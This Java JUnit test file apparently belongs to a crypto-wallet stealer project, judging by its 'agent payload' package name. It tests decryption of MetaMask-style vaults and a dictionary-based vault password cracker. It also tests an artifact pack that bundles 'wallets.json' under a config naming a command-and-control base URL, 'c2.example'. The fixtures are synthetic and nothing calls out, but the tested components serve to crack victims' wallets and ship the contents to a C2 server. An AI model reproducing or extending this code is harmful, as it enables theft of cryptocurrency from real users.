package com.spcagentpayloa.jvmxx.crypto;

import com.spcagentpayloa.jvmxx.Json;
import org.junit.jupiter.api.Test;

import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Synthetic vault fixtures: no real seed or password in the repo. */
class VaultV3Test {
	private static final String PASSWORD = "correct horse battery staple";
	private static final String PAYLOAD = "{\"data\":\"{\\\"mnemonic\\\":\\\"abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about\\\"}\",\"keyrings\":[]}";

	@Test
	void decryptsMetamaskShape() throws Exception {
		Map<String, Object> vault = VaultV3.seal(PAYLOAD, PASSWORD, 10_000);
		VaultV3.Result result = VaultV3.decrypt(Json.stringify(vault), PASSWORD);
		assertTrue(result.ok());
		assertEquals(PAYLOAD, result.plaintext());
		assertEquals(10_000, result.iterations());
	}

	@Test
	void rejectsWrongPassword() throws Exception {
		Map<String, Object> vault = VaultV3.seal(PAYLOAD, PASSWORD, 10_000);
		VaultV3.Result result = VaultV3.decrypt(Json.stringify(vault), "wrong");
		assertFalse(result.ok());
		assertEquals("wrong_password", result.reason());
	}

	@Test
	void rejectsTamperedCiphertext() throws Exception {
		Map<String, Object> vault = VaultV3.seal(PAYLOAD, PASSWORD, 10_000);
		byte[] raw = Base64.getDecoder().decode(String.valueOf(vault.get("data")));
		raw[raw.length - 1] ^= 0x01;
		vault.put("data", Base64.getEncoder().encodeToString(raw));
		assertFalse(VaultV3.decrypt(Json.stringify(vault), PASSWORD).ok());
	}

	@Test
	void honoursVaultIterationCount() throws Exception {
		Map<String, Object> vault = VaultV3.seal(PAYLOAD, PASSWORD, 2_500);
		assertTrue(VaultV3.decrypt(Json.stringify(vault), PASSWORD).ok());
	}

	@Test
	void crackerFindsDictionaryPassword() throws Exception {
		Map<String, Object> vault = VaultV3.seal(PAYLOAD, "letmein", 10_000);
		VaultCracker.Result result = VaultCracker.crack(Json.stringify(vault), 20, 90, "", new java.util.concurrent.atomic.AtomicBoolean(false));
		assertTrue(result.found());
		assertEquals("letmein", result.password());
	}

	@Test
	void artifactContainerRoundTripAndTamper() throws Exception {
		Map<String, Object> map = new LinkedHashMap<>();
		map.put("build_id", "00000000-0000-4000-8000-000000000001");
		map.put("build_secret", Base64.getUrlEncoder().withoutPadding().encodeToString(CryptoUtil.random(32)));
		map.put("c2_base", "https://c2.example/api/v1");
		map.put("profile", "full");
		CryptoConfig config = new CryptoConfig(map);
		ArtifactPack pack = new ArtifactPack(config, "00000000-0000-4000-8000-000000000002", "wallets");
		pack.add("{\"wallets\":[]}".getBytes(java.nio.charset.StandardCharsets.UTF_8), "wallets.json", "index");
		java.nio.file.Path dir = java.nio.file.Files.createTempDirectory("spc-pack");
		java.nio.file.Path target = dir.resolve("a.spc");
		pack.build(target);
		assertTrue(java.nio.file.Files.size(target) > 20);
		String text = java.nio.file.Files.readString(target, java.nio.charset.StandardCharsets.ISO_8859_1);
		assertTrue(text.startsWith("{\"container_version\":1"));
		assertTrue(text.contains("\nBLOB a1 "));
		assertNotNull(ArtifactPack.sha256(target));
	}
}
